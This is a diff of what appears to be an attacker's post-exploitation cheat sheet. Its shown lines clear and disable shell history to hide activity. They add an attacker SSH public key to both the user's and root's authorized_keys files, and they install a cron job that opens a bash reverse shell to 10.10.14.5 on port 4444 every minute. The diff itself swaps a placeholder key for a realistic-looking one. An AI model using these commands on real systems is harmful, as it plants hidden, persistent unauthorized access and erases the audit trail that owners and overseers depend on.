@@ -385,12 +385,13 @@ export HISTFILE=/dev/null              # redirect history to /dev/null
 history -c && history -w               # clear existing history
 ln -sf /dev/null ~/.bash_history       # permanent: symlink to /dev/null
 
-# SSH authorized_keys persistence:
+# SSH authorized_keys persistence — swap the key body for your attacker public key (cat ~/.ssh/id_ed25519.pub)
+ATTACKER_KEY='ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMnI2pUQJrCZq0LxYt5HkXv1bA3PwRkFyEoFUqVx8ZMT attacker@kali'
 mkdir -p ~/.ssh && chmod 700 ~/.ssh
-echo "ssh-rsa AAAA...ATTACKERKEY... attacker" >> ~/.ssh/authorized_keys
+echo "$ATTACKER_KEY" >> ~/.ssh/authorized_keys
 chmod 600 ~/.ssh/authorized_keys
 # Also add to root if accessible:
-echo "ssh-rsa AAAA...ATTACKERKEY... attacker" >> /root/.ssh/authorized_keys
+echo "$ATTACKER_KEY" >> /root/.ssh/authorized_keys
 
 # Cron-based persistence:
 (crontab -l 2>/dev/null; echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'") | crontab -
